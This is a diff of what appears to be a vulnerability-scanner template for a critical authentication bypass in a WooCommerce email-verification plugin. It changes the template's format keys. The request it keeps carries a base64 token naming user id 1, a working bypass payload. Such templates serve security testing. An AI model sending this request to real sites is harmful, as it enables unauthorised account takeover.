@@ -14,10 +14,8 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-288
   tags: woocommerce,wp,wpscan,wordpress,wp-plugin
-  metadata:
-    max-request: 2
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
